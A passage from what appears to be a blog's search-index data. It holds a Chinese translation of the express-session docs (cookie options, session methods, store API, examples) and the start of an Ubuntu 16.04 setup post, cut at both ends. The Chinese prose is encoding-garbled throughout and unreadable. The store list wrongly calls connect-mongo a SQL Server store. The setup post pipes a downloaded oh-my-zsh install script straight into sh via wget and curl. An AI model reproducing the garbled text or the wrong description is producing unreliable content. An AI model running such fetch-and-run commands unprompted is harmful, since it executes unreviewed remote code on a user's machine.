¼çš„ç›¸åŒç«™ç‚¹å¼ºåˆ¶ã€‚\n\nå…³äºä¸åŒçš„å¼ºåˆ¶çº§åˆ«çš„æ›´å¤šä¿¡æ¯å¯ä»¥åœ¨ç»†åˆ™ä¸­æ‰¾åˆ°<https://tools.ietf.org/html/draft-west-first-party-cookies-07#section-4.1.1>  \n**æ³¨æ„**ï¼šè¿™æ˜¯ä¸€ä¸ªè¿˜æœªè¢«å®Œå…¨æ ‡å‡†åŒ–çš„å±æ€§å¹¶ä¸”å°†æ¥å¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚è¿™æ„å‘³ç€è®¸å¤šå®¢æˆ·ç«¯å¯èƒ½å¿½ç•¥è¿™æ¡å±æ€§ç›´åˆ°å®ƒä»¬å®Œå…¨ç†è§£å®ƒä¸ºæ­¢ã€‚\n\n###### cookie.secure\n\nä¸º Set-Cookie å±æ€§ä¸­çš„ Secure æŒ‡å®š boolean å€¼ã€‚å½“ä¸ºçœŸæ—¶ï¼ŒSecure å±æ€§è¢«è®¾ç½®å¦åˆ™æ²¡æœ‰è®¾ç½®ã€‚é»˜è®¤æƒ…å†µä¸‹ Secure å±æ€§æ²¡æœ‰è¢«è®¾ç½®ã€‚  \n**æ³¨æ„**ï¼šå½“è®¾ç½®è¯¥å€¼ä¸º true çš„æ—¶å€™è¯·å°å¿ƒï¼Œå› ä¸ºå¦‚æœæµè§ˆå™¨æ²¡æœ‰å»ºç«‹ HTTPS è¿æ¥æœä»åè®®çš„å®¢æˆ·ç«¯å°†ä¸ä¼šå‘é€ cookie è¿”å›ç»™æœåŠ¡ç«¯ã€‚  \nè¯·æ³¨æ„ secure: true æ˜¯æ¨èé€‰é¡¹ã€‚ç„¶è€Œï¼Œå®ƒéœ€è¦å¯ç”¨ HTTPS çš„ç½‘ç«™ï¼Œ ä¹Ÿå°±æ˜¯ HTTPS  æ˜¯ secure cookies æ‰€å¿…é¡»çš„ã€‚å¦‚æœ secure è¢«è®¾ç½®è€Œä½ é€šè¿‡ HTTP è®¿é—®ä½ çš„ç«™ç‚¹ï¼Œcookie å°†ä¸ä¼šè¢«è®¾ç½®ã€‚å¦‚æœä½ åœ¨ä»£ç†åä½¿ç”¨ node.js å¹¶ä¸”è®¾ç½® secure: trueï¼Œä½ éœ€è¦åœ¨ express ä¸­è®¾ç½® \"trust proxy\"ï¼š\n\n```javascript\nvar app = express()\napp.set('trust proxy', 1) // trust first proxy\napp.use(session({\n  secret: 'keyboard cat',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: true }\n}))\n```\n\nä¸ºäº†åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ secure cookiesï¼ŒåŒæ—¶å…è®¸åœ¨å¼€å‘ç¯å¢ƒä¸­æµ‹è¯•ï¼Œä¸‹åˆ—æ˜¯åœ¨ express ä¸­åŸºäº `NODE_ENV` å¯ç”¨æ­¤è®¾ç½®çš„ç¤ºä¾‹ï¼š\n\n```javascript\nvar app = express()\nvar sess = {\n  secret: 'keyboard cat',\n  cookie: {}\n}\n \nif (app.get('env') === 'production') {\n  app.set('trust proxy', 1) // trust first proxy\n  sess.cookie.secure = true // serve secure cookies\n}\n \napp.use(session(sess))\n```\n\ncookie.secure é€‰é¡¹ä¹Ÿå¯ä»¥è¢«è®¾ç½®æˆç‰¹æ®Šå€¼ \"auto\" æ¥è®©è¿™ä¸ªè®¾ç½®è‡ªåŠ¨å’Œç¡®å®šçš„è¿æ¥çš„å®‰å…¨æ€§ç›¸åŒ¹é…ã€‚å¦‚æœç«™ç‚¹å¯ä»¥åŒæ—¶ç”¨åš HTTP å’Œ HTTPS è¯·å°å¿ƒä½¿ç”¨è¿™ä¸ªè®¾ç½®ï¼Œå› ä¸ºä¸€æ—¦ cookie çš„ HTTPS å±æ€§è¢«è®¾ç½®ï¼Œcookie ä¸ä¼šå†å¯¹ HTTP å¯è§ã€‚å½“ Express çš„ \"trust proxy\" è¢«æ­£ç¡®è®¾ç½®æ¥ç®€åŒ–å¼€å‘å’Œç”Ÿäº§é…ç½®çš„æ—¶å€™ï¼Œè¿™éå¸¸æœ‰ç”¨ã€‚\n\n##### genid\n\nè°ƒç”¨æ¥ç”Ÿæˆä¸€ä¸ªæ–°çš„ session ID çš„å‡½æ•°ã€‚æä¾›ä¸€ä¸ªè¿”å› string ç±»å‹å¹¶å°†è¢«ç”¨æ¥ä½œä¸º session ID çš„å‡½æ•°ã€‚å½“ç”Ÿæˆ ID çš„æ—¶å€™å¦‚æœä½ æƒ³ç”¨ä¸€äº›é™„åŠ åˆ° req çš„å€¼ï¼Œè¯¥å‡½æ•°å·²ç»™å®š req ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ã€‚  \né»˜è®¤å€¼æ˜¯ä¸€ä¸ªä½¿ç”¨ `uid-safe` åº“æ¥ç”Ÿæˆ ID çš„å‡½æ•°ã€‚  \n**æ³¨æ„**ï¼šè¯·å°å¿ƒç”Ÿæˆå”¯ä¸€çš„ ID ä»¥ä¾¿ä½ çš„ sessions ä¸ä¼šäº§ç”Ÿå†²çªã€‚\n\n```javascript\napp.use(session({\n  genid: function(req) {\n    return genuuid() // use UUIDs for session IDs\n  },\n  secret: 'keyboard cat'\n}))\n```\n\n##### name\n\nè®¾ç½®åœ¨ response ä¸­ï¼ˆå’Œä» request ä¸­è¯»å–ï¼‰çš„ session ID çš„ cookie çš„ nameã€‚  \né»˜è®¤å€¼ä¸º `\"connect.sid\"`ã€‚  \n**æ³¨æ„**ï¼šå¦‚æœä½ æœ‰å¤šä¸ªè¿è¡Œåœ¨ç›¸åŒ hostnameï¼ˆåªæ˜¯åå­—ï¼Œä¹Ÿå°±æ˜¯ localhost æˆ–è€… 127.0.0.1ï¼›ä¸åŒçš„åè®®(scheme) å’Œ ç«¯å£(port) ä¸å‘½åä¸åŒçš„ä¸»æœºåï¼‰ä¸Šçš„åº”ç”¨ï¼Œé‚£ä¹ˆä½ éœ€è¦å°† session cookie å½¼æ­¤åˆ†å¼€ã€‚æœ€ç®€å•çš„æ–¹æ³•æ˜¯æ¯ä¸ªåº”ç”¨è®¾ç½®ä¸åŒçš„ nameã€‚\n\n##### proxy\n\nå½“è®¾ç½® secure cookies çš„æ—¶å€™ç›¸ä¿¡åå‘ä»£ç†ï¼ˆé€šè¿‡ `\"X-Forwarded-Proto\"` å¤´ï¼‰ã€‚  \né»˜è®¤å€¼ä¸º `undefined`ã€‚  \n* `true` è¡¨ç¤º `\"X-Forwarded-Proto\"` å¤´å°†ä¼šè¢«ä½¿ç”¨ã€‚\n* `false` è¡¨ç¤ºåªæœ‰å­˜åœ¨ç›´æ¥çš„ TLS/SSL è¿æ¥æ—¶æ‰ä¼šå¿½ç•¥æ‰€æœ‰å¤´å¹¶è®¤ä¸ºè¿æ¥æ˜¯å®‰å…¨çš„ã€‚\n* `undefined` è¡¨ç¤ºä» express ä¸­ä½¿ç”¨ \"trust proxy\"ã€‚\n\n##### resave\n\nåŠæ—¶å›è¯åœ¨è¯·æ±‚æœŸé—´ä»æœªè¢«ä¿®æ”¹è¿‡ä¹Ÿå¼ºåˆ¶ session ä¿å­˜å› session å­˜å‚¨ã€‚æ ¹æ®ä½ çš„å­˜å‚¨è¿™å¯èƒ½æ˜¯å¿…é¡»çš„ï¼Œä½†æ˜¯è¿™ä¹Ÿå¯èƒ½åˆ›é€ ç«äº‰æ¡ä»¶å½“å®¢æˆ·ç«¯å‘é€ä¸¤ä¸ªå¹¶è¡Œè¯·æ±‚åˆ°ä½ çš„æœåŠ¡ç«¯å¹¶ä¸”å…¶ä¸­ä¸€ä¸ªè¯·æ±‚A å¯¹ session ä½œå‡ºçš„æ›´æ”¹å¯èƒ½ä¼šåœ¨å¦ä¸€ä¸ªè¯·æ±‚ B ç»“æŸæ—¶è¢«è¦†ç›–å³ä½¿è¯·æ±‚ B æ²¡æœ‰åšä»»ä½•æ›´æ”¹ï¼ˆè¿™ä¸ªè¡Œä¸ºå–å†³äºä½ ç”¨çš„ session å­˜å‚¨ï¼‰ã€‚  \né»˜è®¤å€¼ä¸º trueï¼Œä½†æ˜¯ä¸æ¨èä½¿ç”¨é»˜è®¤å€¼ï¼Œå› ä¸ºé»˜è®¤å€¼å°†æ¥ä¼šè¢«æ›´æ”¹ã€‚è¯·ç ”ç©¶æ­¤é¡¹è®¾ç½®å¹¶é€‰æ‹©é€‚åˆä½ çš„ç”¨ä¾‹çš„é€‰é¡¹ã€‚ä¸€èˆ¬æ¥è®²ï¼Œä½ ä¼šæƒ³é€‰æ‹© falseã€‚  \næˆ‘æ€ä¹ˆçŸ¥é“è¯¥è®¾ç½®å¯¹æˆ‘çš„ session å­˜å‚¨æ¥è®²æ˜¯ä¸æ˜¯å¿…é¡»çš„å‘¢ï¼Ÿæœ€å¥½çš„æ–¹æ³•æ˜¯æ£€æŸ¥ä½ çš„å­˜å‚¨çœ‹å®ƒæ˜¯å¦å®ç°äº† touch æ–¹æ³•ã€‚å¦‚æœå®ƒå®ç°äº†ï¼Œé‚£ä½ å¯ä»¥å®‰å…¨åœ°è®¾ç½® resave ä¸º falseã€‚å¦‚æœå®ƒæ²¡æœ‰å®ç° touch æ–¹æ³•è€Œä¸”ä½ çš„ store åœ¨å­˜å‚¨çš„ sessions ä¸­è®¾å®šçš„ expiration æ—¥æœŸï¼Œé‚£ä¹ˆä½ å¯èƒ½éœ€è¦è®¾ç½® resave: falseã€‚\n\n##### rolling\n\nå¼ºåˆ¶åœ¨æ¯æ¬¡å“åº”çš„æ—¶å€™è®¾ç½®ä¸€ä¸ª session æ ‡å¿—ç¬¦ cookieã€‚expiration é‡æ–°è¢«è®¾ç½®ä¸ºåˆå§‹çš„ maxAgeï¼Œé‡ç½® expiration å€’è®¡æ—¶ã€‚  \né»˜è®¤å€¼ä¸º falseã€‚  \n**æ³¨æ„**ï¼šå½“è¯¥é€‰é¡¹è¢«è®¾ç½®ä¸º true ä½†æ˜¯ saveUninitialized é€‰é¡¹è¢«è®¾ç½®ä¸º falseï¼Œåˆ™ä¸ä¼šåœ¨å…·æœ‰æœªåˆå§‹åŒ–çš„ session å“åº”ä¸­è®¾ç½® cookieã€‚\n\n##### saveUninitialized\n\nå¼ºåˆ¶å°†æœªåˆå§‹åŒ–çš„ session ä¿å­˜å› storeã€‚å½“ä¸€ä¸ª session æ˜¯æ–°çš„ä½†æ˜¯è¿˜æœªè¢«ä¿®æ”¹æ—¶æˆ‘ä»¬è¯´ä»–æ˜¯æœªåˆå§‹åŒ–çš„ã€‚é€‰æ‹© false å€¼å¯¹å®ç°ç™»å½• session æ˜¯æœ‰ç”¨çš„ï¼Œå› ä¸ºå®ƒå‡å°‘äº†æœåŠ¡å™¨å­˜å‚¨çš„ç”¨é‡ï¼Œéµå®ˆäº†è®¾ç½® cookie å‰éœ€è¦è®¸å¯çš„è§„åˆ™ã€‚é€‰æ‹© false å€¼ä¹Ÿæœ‰åŠ©äºå®¢æˆ·ç«¯åœ¨æ²¡æœ‰å›è¯çš„æƒ…å†µä¸‹å‘å‡ºè¿‡ä¸ªå¹¶è¡Œè¯·æ±‚çš„ç«äº‰æ¡ä»¶ã€‚  \né»˜è®¤å€¼ä¸º trueï¼Œä½†æ˜¯ä¸æ¨èä½¿ç”¨é»˜è®¤å€¼ï¼Œå› ä¸ºé»˜è®¤å€¼å°†æ¥ä¼šè¢«æ›´æ”¹ã€‚è¯·ç ”ç©¶æ­¤é¡¹è®¾ç½®å¹¶é€‰æ‹©é€‚åˆä½ çš„ç”¨ä¾‹çš„é€‰é¡¹ã€‚  \n**æ³¨æ„**ï¼šå¦‚æœä½ æ­£åœ¨ç»“åˆ PassportJS ä½¿ç”¨ Sessionï¼Œç”¨æˆ·é€šè¿‡èº«ä»½éªŒè¯åPassportJS å°†ä¸ºè¯¥ç”¨æˆ·åœ¨ session ä¸­æ·»åŠ ä¸€ä¸ªç©ºçš„ Passport å¯¹è±¡ï¼Œè¿™å°†ä¼šè§†ä¸ºå¯¹ session çš„ä¿®æ”¹ï¼Œå¯¼è‡´ session è¢«ä¿å­˜ã€‚*è¿™å·²ç»åœ¨ PassportJS 0.3.0 ä¸­è¢«ä¿®å¤ã€‚*\n\n##### secret\n\n**å¿…è®¾é€‰é¡¹**  \nè¿™æ˜¯ç”¨æ¥ç»™ session ID cookie ç­¾åçš„ secretã€‚è¿™å¯ä»¥æ˜¯å•ä¸ª secret çš„å­—ç¬¦ä¸²ä¹Ÿå¯ä»¥æ˜¯å¤šä¸ª secret ç»„æˆçš„æ•°ç»„ã€‚å¦‚æœæä¾›äº†ä¸€ç»„ secretsï¼Œåªæœ‰ç¬¬ä¸€ä¸ªå…ƒç´ ä¼šè¢«ç”¨æ¥ç»™ session ID cookie ç­¾åï¼Œåœ¨éªŒè¯è¯·æ±‚ç­¾åçš„æ—¶å€™æ‰ä¼šè€ƒè™‘åˆ°æ‰€æœ‰å…ƒç´ ã€‚\n\n##### store\n\nsession å­˜å‚¨å®ä¾‹ï¼Œé»˜è®¤ä¸ºä¸€ä¸ªæ–°çš„ MemoryStore å®ä¾‹ã€‚\n\n##### unset\n\næ§åˆ¶å–æ¶ˆè®¾ç½® req.session çš„ç»“æœï¼ˆé€šè¿‡åˆ é™¤ï¼Œè®¾ä¸º nullï¼Œç­‰ç­‰ï¼‰ã€‚  \né»˜è®¤å€¼ä¸º **'keep'**  \n* `'destroy'` è¡¨ç¤ºå½“å“åº”ç»“æŸçš„æ—¶å€™ session å°†ä¼šè¢«é”€æ¯ï¼ˆåˆ é™¤ï¼‰ã€‚\n* `'keep'` è¡¨ç¤ºåœ¨ store ä¸­çš„ session ä¼šè¢«ä¿ç•™ï¼Œä½†æ˜¯åœ¨è¯·æ±‚æœŸé—´åšçš„ä¿®æ”¹å°†ä¼šè¢«å¿½ç•¥ä¸ä¼šè¢«ä¿å­˜ã€‚\n\n### req.session\n\nå­˜å‚¨æˆ–è€…è®¿é—® session æ•°æ®ï¼Œåªéœ€è¦ä½¿ç”¨è¯·æ±‚å±æ€§ req.sessionï¼Œè¯¥å±æ€§ï¼ˆé€šå¸¸ï¼‰ç”± store åºåˆ—åŒ–ä¸º sessionï¼Œæ‰€ä»¥ä¸€èˆ¬æ¥è¯´åµŒå¥—å¯¹è±¡ä¹Ÿå¯ä»¥æ¥å—ã€‚ä¸‹é¢çš„ç¤ºä¾‹æ˜¯ä¸€ä¸ªåŸºäºç‰¹å®šç”¨æˆ·çš„è§†å›¾è®¡æ•°å™¨ï¼š\n\n```javascript\n// Use the session middleware\napp.use(session({ secret: 'keyboard cat', cookie: { maxAge: 60000 }}))\n \n// Access the session as req.session\napp.get('/', function(req, res, next) {\n  if (req.session.views) {\n    req.session.views++\n    res.setHeader('Content-Type', 'text/html')\n    res.write('<p>views: ' + req.session.views + '</p>')\n    res.write('<p>expires in: ' + (req.session.cookie.maxAge / 1000) + 's</p>')\n    res.end()\n  } else {\n    req.session.views = 1\n    res.end('welcome to the session demo. refresh!')\n  }\n})\n```\n\n#### Session.regenerate(callback)\n\nè¦é‡æ–°ç”Ÿæˆ session åªéœ€è¦è°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚å®Œæˆåä¸€ä¸ªæ–°çš„ SID å’Œ Session å®ä¾‹å°†ä¼šè¢«åˆå§‹åŒ–åœ¨ req.session å¹¶ä¸” callback ä¼šè¢«è°ƒç”¨ã€‚\n\n```javascript\nreq.session.regenerate(function(err) {\n  // will have a new session here\n})\n```\n\n#### Session.destroy(callback)  \né”€æ¯ Session å¹¶å–æ¶ˆè®¾ç½® req.session å±æ€§ã€‚å®Œæˆåå°†è°ƒç”¨ callbackã€‚  \n```javascript\nreq.session.destroy(function(err) {\n  // cannot access session here\n})\n```\n\n#### Session.reload(callback)\n\nä» store é‡æ–°è½½å…¥ session æ•°æ®å¹¶é‡æ–°å¡«å…… req.session å¯¹è±¡ã€‚å®Œæˆåå°†è°ƒç”¨ callbackã€‚\n\n```javascript\nreq.session.reload(function(err) {\n  // session updated\n})\n```\n\n#### Session.save(callback)\n\nå°† session ä¿å­˜å› storeï¼Œç”¨å†…å­˜ä¸­çš„å†…å®¹æ›¿æ¢ store ä¸­çš„å†…å®¹ï¼ˆå°½ç®¡ store å¯èƒ½è¿˜ä¼šåšå…¶ä»–çš„äº‹æƒ…â€”å‚é˜… store çš„æ–‡æ¡£ä»¥äº†è§£å…¶ç¡®åˆ‡çš„è¡Œä¸ºï¼‰ã€‚  \nå¦‚æœ session æ•°æ®è¢«æ”¹å˜äº†è¿™ä¸ªæ–¹æ³•ä¼šåœ¨ HTTP å“åº”çš„æœ«å°¾è‡ªåŠ¨è¢«è°ƒç”¨ï¼ˆå°½ç®¡è¿™ä¸ªè¡Œä¸ºå¯ä»¥è¢«ä¸­é—´ä»¶æ„é€ å™¨ä¸­çš„å¤šç§é€‰é¡¹æ‰€æ”¹å˜ï¼‰ã€‚å› æ­¤ï¼Œä¸€èˆ¬æ¥è®²è¿™ä¸ªæ–¹æ³•ä¸éœ€è¦è¢«æ‰‹åŠ¨è°ƒç”¨ã€‚  \nå­˜åœ¨ä¸€äº›è°ƒç”¨è¿™ä¸ªæ–¹æ³•ä¼šå¾ˆæœ‰ç”¨çš„æƒ…å†µï¼Œæ¯”å¦‚é‡å®šå‘ï¼Œé•¿æœŸè¯·æ±‚ï¼ˆlong-lived requestsï¼‰æˆ–ç€ WebSocketsã€‚\n\n```javascript\nreq.session.save(function(err) {\n  // session saved\n})\n```\n\n#### Session.touch(callback)\n\næ›´æ–° .maxAge å±æ€§ã€‚ä¸€èˆ¬æ¥è®²è¿™ä¸ªæ–¹æ³•ä¸éœ€è¦è¢«è°ƒç”¨å› ä¸º session ä¸­é—´ä»¶ä¸ºä½ æ‰§è¡Œäº†è¿™ä¸ªæ“ä½œã€‚\n\n### req.session.id\n\næ¯ä¸€ä¸ª session éƒ½æœ‰ä¸€ä¸ªä¸ä¹‹å…³è”çš„å”¯ä¸€ IDã€‚è¯¥å±æ€§æ˜¯ req.sessionID çš„åˆ«åè€Œä¸”æ— æ³•ä¿®æ”¹ã€‚è¯¥å±æ€§å·²è¢«æ·»åŠ ä»¥ä½¿ session ID å¯ä»¥ä» session å¯¹è±¡ä¸­è®¿é—®ã€‚\n\n### req.session.cookie\n\næ¯ä¸€ä¸ª session éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„ cookie ä¸ä¹‹ä¼´éšã€‚è¿™å…è®¸ä½ æ›´æ”¹æ¯ä¸ªè®¿é—®è€…çš„ session cookieã€‚ä¾‹å¦‚æˆ‘ä»¬å¯ä»¥è®¾ç½® req.session.cookie.expires ä¸º false æ¥ä½¿ cookie ä»…åœ¨ç”¨æˆ·-ä»£ç†çš„æŒç»­æ—¶é—´ä¸­ä¿ç•™ã€‚\n\n#### Cookie.maxAge\n\nreq.session.cookie.maxAge å°†ä»¥æ¯«ç§’æ•°è¿”å›å‰©ä½™çš„æ—¶é—´ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é‡æ–°åˆ†é…ä¸€ä¸ªæ–°å€¼æ¥é€‚å½“åœ°è°ƒæ•´ .expires å±æ€§ã€‚ä»¥ä¸‹ä»£ç æ˜¯ç­‰æ•ˆçš„ï¼š\n\n```javascript\nvar hour = 3600000\nreq.session.cookie.expires = new Date(Date.now() + hour)\nreq.session.cookie.maxAge = hour\n```\n\nä¾‹å¦‚å½“ maxAge è¢«è®¾ç½®ä¸º 60000ï¼ˆä¸€åˆ†é’Ÿï¼‰æ—¶ï¼Œä¸‰åç§’åå®ƒå°†è¿”å› 30000 çŸ¥é“å½“å‰çš„è¯·æ±‚å·²å®Œæˆï¼Œæ­¤æ—¶è°ƒç”¨ req.session.touch() å°†ä¼šé‡è®¾ req.session.maxAge ä¸ºå®ƒçš„åˆå§‹å€¼ã€‚\n\n```javascript\nreq.session.cookie.maxAge // => 30000\n```\n\n### req.sessionID\n\nè¦æ‹¿åˆ°è½½å…¥çš„ session çš„ IDï¼Œè®¿é—®è¯·æ±‚çš„å±æ€§ req.sessionIDã€‚å½“ session è¢«è½½å…¥æˆ–è¢«åˆ›å»ºçš„æ—¶å€™è¿™ä»…æ˜¯ä¸€ä¸ªåªè¯»çš„å€¼ã€‚\n\n## Session Store Implementation\n\næ¯ä¸€ä¸ª session store å¿…é¡»æ˜¯ä¸€ä¸ª EventEmitter å¹¶ä¸”å®ç°ç‰¹å®šçš„æ–¹æ³•ã€‚ä¸‹åˆ—çš„æ–¹æ³•æ˜¯å¿…éœ€ï¼Œæ¨èå’Œå¯é€‰çš„åˆ—è¡¨ã€‚\n\n* å¿…éœ€çš„æ–¹æ³•æ˜¯æ­¤æ¨¡å—å°†ä¼šå§‹ç»ˆåœ¨ store ä¸­è°ƒç”¨çš„æ–¹æ³•ã€‚\n* æ¨èçš„æ–¹æ³•æ˜¯å¦‚æœå¯ç”¨æ­¤æ¨¡å—å°†ä¼šåœ¨ store ä¸­è°ƒç”¨çš„æ–¹æ³•ã€‚\n* å¯é€‰çš„æ–¹æ³•æ˜¯æ­¤æ¨¡å—æ ¹æœ¬ä¸ä¼šè°ƒç”¨çš„æ–¹æ³•\n\næœ‰å…³ç¤ºä¾‹å®ç°è¯·æŸ¥çœ‹ [connect-redis](http://github.com/visionmedia/connect-redis) ä»“åº“ã€‚\n\n### store.all(callback)\n\n**å¯é€‰**  \nè¯¥å¯é€‰æ–¹æ³•ç”¨äºä»¥æ•°ç»„å½¢å¼è·å– store ä¸­çš„æ‰€æœ‰ sessionã€‚å›è°ƒæ–¹æ³•åº”è¯¥ä½¿ç”¨ä¸º `callback(error, sessions)`ã€‚\n\n### store.destroy(sid, callback)\n\n**å¿…éœ€**  \nè¯¥å¿…éœ€æ–¹æ³•æ ¹æ®ç»™å®šçš„ session ID æ¥é”€æ¯ï¼ˆåˆ é™¤ï¼‰store ä¸­çš„ sessionã€‚sessionè¢«åˆ é™¤åå›è°ƒå‡½æ•°åº”è¯¥ä½¿ç”¨ä¸º `callback(error)`ã€‚\n\n### store.clear(callback)\n\n**å¯é€‰**  \nè¯¥å¯é€‰æ–¹æ³•ç”¨äºåˆ é™¤ store ä¸­çš„æ‰€æœ‰ sessionã€‚store æ¸…ç©ºåå›è°ƒå‡½æ•°åº”è¯¥ä½¿ç”¨ä¸º `callback(error)`ã€‚\n\n### store.length(callback)\n\n**å¯é€‰**  \nè¯¥å¯é€‰æ–¹æ³•ç”¨äºè·å– store ä¸­æ‰€æœ‰ session çš„ä¸ªæ•°ã€‚å›è°ƒå‡½æ•°åº”è¯¥ä½¿ç”¨ä¸º `callback(error, len)`ã€‚\n\n### store.get(sid, callback)\n\n**å¿…éœ€**  \nè¯¥å¿…éœ€æ–¹æ³•æ ¹æ®ç»™å®šçš„ session ID ä» store ä¸­è·å– sessionã€‚å›è°ƒå‡½æ•°åº”è¯¥ä½¿ç”¨ä¸º `callback(error, session)`ã€‚  \nå¦‚æœæ‰¾åˆ° session å›è°ƒå‡½æ•°ä¸­çš„ session å‚æ•°åº”è¯¥ä¸ºä¸€ä¸ª session å¯¹è±¡ï¼Œå¦åˆ™å¦‚æœæ²¡æœ‰æ‰¾åˆ° sessionï¼ˆå¹¶ä¸”ä¹Ÿæ²¡æœ‰é”™è¯¯ï¼‰åº”è¯¥ä¸º null æˆ– undefinedã€‚å½“ `error.code === 'ENOENT'` è¡¨ç°ä¸º `callback(null, null)` ï¼Œè¿™æ˜¯ä¸€ç§ç‰¹æ®Šæƒ…å†µã€‚\n\n### store.set(sid, session, callback)\n\n**å¿…éœ€**  \nè¯¥å¿…éœ€æ–¹æ³•æ ¹æ®ç»™å®šçš„ session ID å’Œ session å¯¹è±¡å°† session å­˜å…¥ storeã€‚session å­˜å…¥ store åå›è°ƒå‡½æ•°åº”è¯¥ä½¿ç”¨ä¸º `callback(error)`ã€‚\n\n### store.touch(sid, session, callback)\n\n**æ¨è**  \nè¯¥æ¨èæ–¹æ³•æ ¹æ®ç»™å®šçš„ session ID å’Œ session å¯¹è±¡ \"è§¦ç¢°\" ç»™å®šçš„ session å¯¹è±¡ã€‚session è¢« \"è§¦ç¢°\" åå›è°ƒå‡½æ•°åº”è¯¥ä½¿ç”¨ä¸º `callback(error)`ã€‚  \nè¯¥æ–¹æ³•ä¸»è¦ç”¨äº store è‡ªåŠ¨åˆ é™¤ç©ºé—² sessionï¼Œå¹¶å°†æ­¤æ–¹æ³•ç”¨äºå‘ store å‘é€ç»™å®š session å¤„äºæ´»åŠ¨çŠ¶æ€çš„ä¿¡å·ï¼Œå¯èƒ½å›é‡ç½®ç©ºé—²è®¡æ—¶å™¨ã€‚  \n## Compatible Session Stores\n\nä¸‹åˆ—çš„æ¨¡å—æ˜¯å®ç°äº†ä¸€ä¸ªå’Œæœ¬æ¨¡å—å…¼å®¹çš„ session storeã€‚è¯·æå‡º PULL REQUEST æ¥æ·»åŠ å…¶ä»–çš„æ¨¡å— :)  \næœ¬å¤„ä»…åˆ—å‡ºä¸¤å¤„ store å®ç°ï¼Œæ›´å¤šè¯·æŸ¥çœ‹[åŸæ–‡æ¡£](https://www.npmjs.com/package/express-session#compatible-session-stores)  \n[`connect-db2`](https://www.npmjs.com/package/connect-db2): ä¸€ä¸ªä½¿ç”¨ ibm_db æ¨¡å—å»ºæˆçš„åŸºäº IBM DB2 çš„ session storeã€‚  \n[`connect-mongo`](https://www.npmjs.com/package/connect-mongo): ä¸€ä¸ªåŸºäº SQL Server çš„ session storeã€‚\n\n## Example\n\nä¸€ä¸ªç®€å•ä½¿ç”¨ express-session æ¥ä¸ºç”¨æˆ·å­˜å‚¨é¡µé¢è®¿é—®çš„ä¾‹å­ï¼š\n\n```javascript\nvar express = require('express')\nvar parseurl = require('parseurl')\nvar session = require('express-session')\n \nvar app = express()\n \napp.use(session({\n  secret: 'keyboard cat',\n  resave: false,\n  saveUninitialized: true\n}))\n \napp.use(function (req, res, next) {\n  if (!req.session.views) {\n    req.session.views = {}\n  }\n \n  // get the url pathname\n  var pathname = parseurl(req).pathname\n \n  // count the views\n  req.session.views[pathname] = (req.session.views[pathname] || 0) + 1\n \n  next()\n})\n \napp.get('/foo', function (req, res, next) {\n  res.send('you viewed this page ' + req.session.views['/foo'] + ' times')\n})\n \napp.get('/bar', function (req, res, next) {\n  res.send('you viewed this page ' + req.session.views['/bar'] + ' times')\n})\n```\n\n## License\n\n[MIT](https://github.com/expressjs/session/blob/HEAD/LICENSE)\n\n## Keywords\n\nnone","tags":["express-session"]},{"title":"Ubuntu16.04 ä¸ªæ€§åŒ–","url":"/2018/03/27/ubuntu-tips/","content":"\n\n::: info\n\nLast Updated on 2018/04/09\n\n:::\n\nè¿™æ˜¯å®‰è£…å®Œ ubuntu16.04 åï¼Œè‡ªå·±çš„ä¸€äº›ä¸ªæ€§åŒ–ï¼Œè¿˜æœ‰ä¸€äº›æˆ‘ä¸ªäººéœ€è¦å®‰è£…çš„è½¯ä»¶ã€‚å› ä¸ºæ˜¯å†™ç»™è‡ªå·±ç”¨çš„ï¼Œæ‰€ä»¥æœ‰äº›åœ°æ–¹æ²¡æœ‰å†™é‚£ä¹ˆä»”ç»†ã€‚\n\n#### åˆ é™¤è‡ªå¸¦è½¯ä»¶\n\n1. åˆ é™¤ libreoffice  \n   `sudo apt remove libreoffice?`\n2. åˆ é™¤ amazon é“¾æ¥  \n   `sudo apt remove unity-webapps-common`\n3. åˆ é™¤å…¶ä»–è‡ªå¸¦è½¯ä»¶  \n   `sudo apt-get remove thunderbird totem rhythmbox empathy brasero simple-scan gnome-mahjongg aisleriot gnome-mines cheese transmission-common gnome-orca webbrowser-app gnome-sudoku  landscape-client-ui-install onboard deja-dup`\n   <!-- more -->\n\n#### å‘½ä»¤è¡Œå®‰è£…ä¸€äº›ç¨‹åº\n\n- å®‰è£… vim  \n  `sudo apt install vim`\n- å®‰è£… git  \n  `sudo apt install git`ï¼Œå®‰è£…å®Œè®°å¾—é…ç½®\n\n``` sh\ngit config --global user.name \"yourname\"\ngit config --global user.email \"youremail@example.com\"\n```\n\n- å®‰è£…å‹ç¼©å’Œè§£å‹  \n  1. å‹ç¼©åŠŸèƒ½  \n     å®‰è£… `sudo apt-get install rar`  \n     å¸è½½ `sudo apt-get remove rar`  \n  2. è§£å‹åŠŸèƒ½  \n     å®‰è£… `sudo apt-get install unrar`  \n     å¸è½½ `sudo apt-get remove unrar`  \n  3. ä½¿ç”¨å‹ç¼©å’Œè§£å‹ç¼©.rar  \n     è§£å‹ï¼š`rar x FileName.rar`  \n     å‹ç¼©ï¼š`rar a FileName.rar DirName`\n\n#### å®‰è£… zsh å’Œ oh-my-zsh\n\n- å®‰è£… zsh\n  `sudo apt install zsh`  \n- ä¸‹è½½ oh-my-zsh æ¥é…ç½® zsh\n  `wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh`  \n  æˆ–è€…  \n  `sh -c \"$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\"`  \n- è®¾ç½® zsh ä¸ºé»˜è®¤ shell\n  `chsh -s /bin/zsh`\n\n#### å®‰è£…æ‰å¹³åŒ–ä¸»é¢˜\n\n- å®‰è£…æ‰å¹³åŒ–ä¸»é¢˜\n\n```\nsudo add-apt-repository ppa:noobslab/themes\nsudo apt-get update\nsudo apt-get install flatabulous-theme\n```\n\n- å®‰è£…é…å¥—å›¾æ ‡\n\n```\nsudo add-apt-repository ppa:noobslab/icons\nsudo apt-get update\nsudo apt-get install ultra-flat-icons\n```\n\n- ä½¿ç”¨ unity-tweak-tool ä¿®æ”¹ä¸»é¢˜å’Œå›¾æ ‡\n\n#### å®‰è£…é¡¶æ 